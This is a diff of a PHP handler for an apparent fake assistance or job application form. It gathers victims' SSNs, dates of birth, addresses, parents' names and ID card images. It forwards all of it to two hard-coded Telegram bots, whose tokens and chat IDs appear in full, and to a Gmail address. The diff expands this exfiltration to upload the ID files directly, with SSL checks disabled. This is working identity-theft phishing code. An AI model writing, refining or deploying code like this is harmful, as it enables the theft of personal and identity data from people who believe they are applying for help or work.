@@ -41,7 +41,7 @@ $father_name    = $_POST['father_name'] ?? '';
 $mother_name    = $_POST['mother_name'] ?? '';
 
 // ======================
-// FILE PROCESSING (Temp Disk + Base64 DB Storage)
+// FILE PROCESSING (Temp Storage to Base64)
 // ======================
 $front_path = null;
 $back_path = null;
@@ -87,98 +87,83 @@ $stmt->execute([
     $front_id_base64, $back_id_base64
 ]);
 
-
 // ======================
-// TELEGRAM BOT SETUP
+// TELEGRAM NOTIFICATION SYSTEM
 // ======================
-$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
-$chat1 = "6513265609";
+$bots = [
+    ["token" => "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek", "chat_id" => "6513265609"],
+    ["token" => "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0", "chat_id" => "5469294503"]
+];
 
-$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
-$chat2 = "5469294503";
-
-$baseUrl = "https://homeandrentalassistance.onrender.com";
-
-$front_url = $baseUrl . "/" . $front_id;
-$back_url  = $baseUrl . "/" . $back_id;
-
-
-// ======================
-// FUNCTION
-// ======================
-function sendTelegram($bot, $chat, $url, $data) {
-    file_get_contents("https://api.telegram.org/bot$bot/$url?" . http_build_query($data));
-}
-
-
-// ======================
-// TEXT MESSAGE
-// ======================
-$text = "📄 New Application Submitted\n\n"
+$textMessage = "📄 New Application Submitted\n\n"
 . "👤 Name: $first_name $middle_name $last_name\n"
 . "📞 Phone: $phone\n"
 . "📧 Email: $email\n"
 . "🎂 DOB: $dob\n"
-. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
+. "🏠 Address: $address\n"
 . "🏙 Birth City: $birth_city\n"
 . "👨 Father: $father_name\n"
 . "👩 Mother: $mother_name\n"
 . "🧾 SSN: $ssn";
 
+// Safe message delivery function
+function sendTelegramText($token, $chatId, $text) {
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
+    $params = ['chat_id' => $chatId, 'text' => $text];
+    @file_get_contents($url . "?" . http_build_query($params));
+}
+
+// Secure file delivery function using native streaming streams
+function sendTelegramDocument($token, $chatId, $filePath, $caption) {
+    if (!$filePath || !file_exists($filePath)) return;
+    
+    $url = "https://api.telegram.org/bot" . $token . "/sendDocument";
+    $ch = curl_init();
+    
+    $postFields = [
+        'chat_id'  => $chatId,
+        'document' => new CURLFile($filePath),
+        'caption'  => $caption
+    ];
+    
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+// Send out alerts to your Telegram channels
+foreach ($bots as $bot) {
+    sendTelegramText($bot['token'], $bot['chat_id'], $textMessage);
+    
+    if ($front_path) {
+        sendTelegramDocument($bot['token'], $bot['chat_id'], $front_path, "🪪 Front ID - $first_name $last_name");
+    }
+    if ($back_path) {
+        sendTelegramDocument($bot['token'], $bot['chat_id'], $back_path, "🪪 Back ID - $first_name $last_name");
+    }
+}
 
 // ======================
-// SEND TO BOT 1
+// FILE CLEANUP (Protects Render's ephemeral limits)
 // ======================
-sendTelegram($bot1, $chat1, "sendMessage", [
-    "chat_id" => $chat1,
-    "text" => $text
-]);
-
-sendTelegram($bot1, $chat1, "sendPhoto", [
-    "chat_id" => $chat1,
-    "photo" => $front_url,
-    "caption" => "🪪 Front ID - $first_name $last_name"
-]);
-
-sendTelegram($bot1, $chat1, "sendPhoto", [
-    "chat_id" => $chat1,
-    "photo" => $back_url,
-    "caption" => "🪪 Back ID - $first_name $last_name"
-]);
-
+if ($front_path && file_exists($front_path)) @unlink($front_path);
+if ($back_path && file_exists($back_path)) @unlink($back_path);
 
 // ======================
-// SEND TO BOT 2
-// ======================
-sendTelegram($bot2, $chat2, "sendMessage", [
-    "chat_id" => $chat2,
-    "text" => $text
-]);
-
-sendTelegram($bot2, $chat2, "sendPhoto", [
-    "chat_id" => $chat2,
-    "photo" => $front_url,
-    "caption" => "🪪 Front ID - $first_name $last_name"
-]);
-
-sendTelegram($bot2, $chat2, "sendPhoto", [
-    "chat_id" => $chat2,
-    "photo" => $back_url,
-    "caption" => "🪪 Back ID - $first_name $last_name"
-]);
-
-// ======================
-// EMAIL NOTIFICATION
+// EMAIL BACKUP NOTIFICATION
 // ======================
 $to = "collaomn@gmail.com";
 $subject = "New Job Form Submission";
-$body = $text;
 $headers = "From: noreply@yourdomain.com";
-
-mail($to, $subject, $body, $headers);
+@mail($to, $subject, $textMessage, $headers);
 
 // ======================
-// SUCCESS USER INTERFACE DISPLAY
+// SUCCESS HTML DISPLAY
 // ======================
 echo "
 <div style='max-width:700px;margin:60px auto;padding:50px;background:#0f172a;color:white;border-radius:20px;text-align:center;font-family:Arial,sans-serif;box-shadow:0 10px 30px rgba(0,0,0,0.4);'>
